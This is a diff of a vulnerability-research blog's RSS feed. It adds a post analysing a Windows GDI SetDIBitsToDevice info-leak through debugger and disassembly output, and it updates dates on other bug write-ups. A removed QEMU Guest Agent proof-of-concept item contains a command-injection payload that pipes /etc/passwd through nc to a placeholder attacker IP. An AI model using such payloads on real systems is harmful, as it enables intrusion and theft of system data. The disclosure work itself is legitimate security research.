@@ -5,9 +5,123 @@
     <description>Interested in RE and vulnerability research.</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>2020-06-06</pubDate>
-    <lastBuildDate>Sat, 06 Jun 2020 06:56:23 +0000</lastBuildDate>
+    <pubDate>2020-06-08</pubDate>
+    <lastBuildDate>Mon, 08 Jun 2020 16:11:28 +0000</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
+    
+      <item>
+        <title>Windows GDI SetDIBitsToDevice - Untrusted Pointer Dereference Information Disclosure</title>
+        <description>&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+
+&lt;p&gt;An &lt;strong&gt;Information Disclosure&lt;/strong&gt; can be triggered by running a specially crafted program. The issue was caused by the lack of user-supplied value check before dereferencing it as a pointer in the &lt;strong&gt;GDI32!SetDIBitsToDevice&lt;/strong&gt; function. An attacker can exploit this vulnerability to achieve a sensitive information disclosure.&lt;/p&gt;
+
+&lt;h1 id=&quot;crash-analysis&quot;&gt;Crash Analysis&lt;/h1&gt;
+
+&lt;p&gt;Initial crash:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:000&amp;gt; g
+ModLoad: 742a0000 742cb000   C:\Windows\SysWOW64\IMM32.DLL
+ModLoad: 768d0000 769f0000   C:\Windows\SysWOW64\MSCTF.dll
+ModLoad: 74060000 7411e000   C:\Windows\SysWOW64\msvcrt.dll
+(2570.2010): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00808276 ebx=00000001 ecx=00000080 edx=00000000 esi=00808076 edi=00828db8
+eip=76f9e7e3 esp=007cf31c ebp=007cf324 iopl=0         nv up ei pl nz ac pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216
+ntdll!memcpy+0x33:
+76f9e7e3 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;bug-analysis&quot;&gt;Bug Analysis&lt;/h1&gt;
+
+&lt;p&gt;Before the user-supplied pointer is dereferenced, a chunk of memory of user-controlled size is allocated by the &lt;strong&gt;RtlAllocateHeap&lt;/strong&gt; function. However, there is a bit check to ensure that certain flag is enabled but this can be easily bypassed by masking the address of the user pointer with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x3&lt;/code&gt;. Thus shifted the address which may not be suitable in some conditions.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:000000018001CC8A                 mov     rax, gs:30h
+.text:000000018001CC93                 and     dword ptr [rax+808h], 0
+.text:000000018001CC9A                 lea     r8, [rsp+158h+Size]
+.text:000000018001CCA2                 mov     edx, r12d
+.text:000000018001CCA5                 mov     rcx, r14
+.text:000000018001CCA8                 call    hrBitmapScanSize
+.text:000000018001CCAD                 test    eax, eax
+.text:000000018001CCAF                 js      loc_180054B9B
+.text:000000018001CCB5                 mov     r14d, 1
+.text:000000018001CCBB                 mov     esi, r14d
+.text:000000018001CCBE                 test    byte ptr [rsp+158h+lpvBits], 3   &amp;lt;-- bit check
+.text:000000018001CCC6                 jnz     loc_18001CDFC
+
+.text:000000018001CDFC loc_18001CDFC:                          ; CODE XREF: SetDIBitsToDevice+146↑j
+.text:000000018001CDFC                 mov     edi, dword ptr [rsp+158h+Size]
+.text:000000018001CE03                 mov     rcx, gs:60h
+.text:000000018001CE0C                 mov     r8d, edi
+.text:000000018001CE0F                 xor     edx, edx
+.text:000000018001CE11                 mov     rcx, [rcx+30h]
+.text:000000018001CE15                 call    cs:__imp_RtlAllocateHeap
+.text:000000018001CE1B                 mov     [rsp+158h+var_70], rax
+.text:000000018001CE23                 mov     [rsp+158h+var_78], rax
+.text:000000018001CE2B                 test    rax, rax
+.text:000000018001CE2E                 jz      loc_18001CCCC
+.text:000000018001CE34
+.text:000000018001CE34 loc_18001CE34:                          ; DATA XREF: .rdata:0000000180150574↓o
+.text:000000018001CE34 ;   __try { // __except at loc_18001CE5C ; Size
+.text:000000018001CE34                 mov     r8d, edi
+.text:000000018001CE37                 mov     rdx, [rsp+158h+lpvBits] ; Src
+.text:000000018001CE3F                 mov     rcx, rax        ; Dst
+.text:000000018001CE42                 call    memcpy_0
+.text:000000018001CE47                 mov     rax, [rsp+158h+var_70]
+.text:000000018001CE4F                 mov     [rsp+158h+lpvBits], rax
+.text:000000018001CE57                 jmp     loc_18001CCCC
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This is how it looks like once the &lt;strong&gt;GDI32!SetDIBitsToDevice&lt;/strong&gt; is hit, all the arguments passed can be found on the stack.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:000&amp;gt; g
+ModLoad: 742a0000 742cb000   C:\Windows\SysWOW64\IMM32.DLL
+ModLoad: 768d0000 769f0000   C:\Windows\SysWOW64\MSCTF.dll
+ModLoad: 74060000 7411e000   C:\Windows\SysWOW64\msvcrt.dll
+Breakpoint 0 hit
+*** WARNING: Unable to verify checksum for SetDIBitsToDevice.exe
+eax=00e7fe18 ebx=7faac000 ecx=00000000 edx=99010a8d esi=0758efdb edi=99010a8d
+eip=76e91f50 esp=00e7fddc ebp=00e7fe48 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+GDI32!SetDIBitsToDevice:
+76e91f50 6a68            push    68h
+0:000&amp;gt; dd esp L13
+00e7fddc  002c10e6 99010a8d 00000000 00000000   &amp;lt;-- *(00e7fddc+4) is the starting of the arguments
+00e7fdec  00000020 00000020 00000000 00000000
+00e7fdfc  00000000 00000020 0758efdb 00e7fe18   &amp;lt;-- these two addresses is lpvBits and a pointer to BITMAPINFO structure
+00e7fe0c  00000000 07589de8 73f92108 00000028   &amp;lt;-- *(00e7fe0c) is DIR_RGB_COLORS
+00e7fe1c  00000020 00000020 00040001
+0:000&amp;gt; dd 00e7fe18
+00e7fe18  00000028 00000020 00000020 00040001   &amp;lt;-- BITMAPINFO structure
+00e7fe28  00000000 00000b12 00000b12 00000010
+00e7fe38  00000010 0066cccc 00ffffff 8a3557da   &amp;lt;-- 0x00ffffff is the BITMAPINFO.RGBQUAD array
+00e7fe48  00e7fe90 002c12ea 00000001 07589de8
+00e7fe58  07584370 8a355702 002c1372 002c1372
+00e7fe68  7faac000 00000000 00000000 00000000
+00e7fe78  00e7fe5c 00000000 00e7fedc 002c1acb
+00e7fe88  8afe8f62 00000000 00e7fea4 74773744
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The memory right after the &lt;strong&gt;BITMAPINFO.RGBQUAD&lt;/strong&gt; is where the color table data is stored and we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lpvBits&lt;/code&gt; pointer to leak any address within this address space. There are many methods to achieve info-leak and one of them is by using &lt;strong&gt;COLORREF&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00e7fe38                             8a3557da
+00e7fe48  00e7fe90 002c12ea 00000001 07589de8
+00e7fe58  07584370 8a355702 002c1372 002c1372
+00e7fe68  7faac000 00000000 00000000 00000000
+00e7fe78  00e7fe5c 00000000 00e7fedc 002c1acb
+00e7fe88  8afe8f62 00000000 00e7fea4 74773744
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>2020-06-08</pubDate>
+        <link>http://localhost:4000/articles/2020-06/microsoft_windows_gdi32_setdibitstodevice</link>
+        <guid isPermaLink="true">http://localhost:4000/articles/2020-06/microsoft_windows_gdi32_setdibitstodevice</guid>
+        
+        <category>Windows GDI</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
     
       <item>
         <title>Foxit Reader 10 - NULL Pointer Dereference</title>
@@ -139,7 +253,7 @@ FoxitReader!safe_vsnprintf+0x9c4ffe:
     0369a6f4 FoxitReader!CFXJSE_Arguments::GetValue+0x00d27824
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>
-        <pubDate>2020-06-06</pubDate>
+        <pubDate>2020-06-08</pubDate>
         <link>http://localhost:4000/articles/2020-05/foxit_reader_10_null_deref</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2020-05/foxit_reader_10_null_deref</guid>
         
@@ -154,7 +268,7 @@ FoxitReader!safe_vsnprintf+0x9c4ffe:
         <title>Windows GDI SetEnhMetaFileBits - Out-of-Bounds Read Information Disclosure</title>
         <description>&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
 
-&lt;p&gt;An &lt;strong&gt;Out-of-Bounds Read&lt;/strong&gt; can be triggered by running a specially crafted program. The issue was caused by a lack of bounds check and initialization in the &lt;strong&gt;GDI32!SetEnhMetaFileBits&lt;/strong&gt; function. An attacker can force an out-of-bounds read in the uninitialized memory address which leads to a sensitive information disclosure.&lt;/p&gt;
+&lt;p&gt;An &lt;strong&gt;Out-of-Bounds Read&lt;/strong&gt; can be triggered by running a specially crafted program. The issue was caused by the lack of bounds check and initialization in the &lt;strong&gt;GDI32!SetEnhMetaFileBits&lt;/strong&gt; function. An attacker can force an out-of-bounds read in the uninitialized memory address which leads to a sensitive information disclosure.&lt;/p&gt;
 
 &lt;h1 id=&quot;crash-analysis&quot;&gt;Crash Analysis&lt;/h1&gt;
 
@@ -252,7 +366,7 @@ ntdll!memcpy+0x213:
 08 00d7f8c8 00000000 009c1353 7f1c5000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>
-        <pubDate>2020-06-06</pubDate>
+        <pubDate>2020-06-08</pubDate>
         <link>http://localhost:4000/articles/2020-05/microsoft_windows_gdi32_setenhmetafilebits</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2020-05/microsoft_windows_gdi32_setenhmetafilebits</guid>
         
@@ -301,7 +415,7 @@ ntdll!memcpy+0x213:
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-06-06</pubDate>
+        <pubDate>2020-06-08</pubDate>
         <link>http://localhost:4000/articles/2020-04/suricata_stack_based_overflow</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2020-04/suricata_stack_based_overflow</guid>
         
@@ -369,7 +483,7 @@ ntdll!memcpy+0x213:
 
 &lt;p&gt;Going down the rabbit hole right before the data is insert into the hash table through &lt;strong&gt;emu_hashtable_insert&lt;/strong&gt; at line 70. &lt;strong&gt;emu_hashtable_search&lt;/strong&gt; is called to check whether the data is already inserted or not. At line 96, the address of the key inside the hash table will be divided with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eh-&amp;gt;size&lt;/code&gt; and triggers the bug.&lt;/p&gt;
 </description>
-        <pubDate>2020-06-06</pubDate>
+        <pubDate>2020-06-08</pubDate>
         <link>http://localhost:4000/articles/2020-03/libemu_divide_by_zero</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2020-03/libemu_divide_by_zero</guid>
         
@@ -490,7 +604,7 @@ index 08e6967dfe1..4b1d988dce2 100644
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-06-06</pubDate>
+        <pubDate>2020-06-08</pubDate>
         <link>http://localhost:4000/articles/2019-08/ipv6_neighbor_router_advertisement</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-08/ipv6_neighbor_router_advertisement</guid>
         
@@ -591,7 +705,7 @@ gs_base 0x0 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-06-06</pubDate>
+        <pubDate>2020-06-08</pubDate>
         <link>http://localhost:4000/articles/2019-08/bhyve_fbuf_null_deref</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-08/bhyve_fbuf_null_deref</guid>
         
@@ -646,7 +760,7 @@ gs_base 0x0 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;corrupt stack?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 </description>
-        <pubDate>2020-06-06</pubDate>
+        <pubDate>2020-06-08</pubDate>
         <link>http://localhost:4000/articles/2019-07/CVE-2019-13614</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-07/CVE-2019-13614</guid>
         
@@ -711,7 +825,7 @@ Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-06-06</pubDate>
+        <pubDate>2020-06-08</pubDate>
         <link>http://localhost:4000/articles/2019-07/CVE-2019-13613</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-07/CVE-2019-13613</guid>
         
@@ -2085,7 +2199,7 @@ Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-06-06</pubDate>
+        <pubDate>2020-06-08</pubDate>
         <link>http://localhost:4000/articles/2019-06/bhyve_hda_bof</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-06/bhyve_hda_bof</guid>
         
@@ -2093,29 +2207,6 @@ Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o
         
         
         <category>blog</category>
-        
-      </item>
-    
-      <item>
-        <title>[CVE-2019-12929] QEMU Guest Agent guest_exec Remote Command Execution</title>
-        <description>&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
-&lt;p&gt;The QMP &lt;strong&gt;guest_exec&lt;/strong&gt; command in QEMU 4.0.0 and earlier is prone to OS command injection, which allows the attacker to achieve code execution, denial of service, or information disclosure by sending a crafted QMP command to the listening server.&lt;/p&gt;
-
-&lt;p&gt;1st, execute the QEMU Guest Agent service
-2nd, open another console and setup a listener to port 9999
-3rd, connect to the target and enter the following commands:&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'execute':'guest-exec'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'arguments':&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'path':'/bin/bash'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'arg':&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'-c'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'cat&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/etc/passwd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;nc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;attacker_ip&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9999&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]}}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-</description>
-        <pubDate>2020-06-06</pubDate>
-        <link>http://localhost:4000/articles/2019-06/CVE-2019-12929</link>
-        <guid isPermaLink="true">http://localhost:4000/articles/2019-06/CVE-2019-12929</guid>
-        
-        <category>qemu</category>
-        
-        
-        <category>proof-of-concept</category>
         
       </item>
     
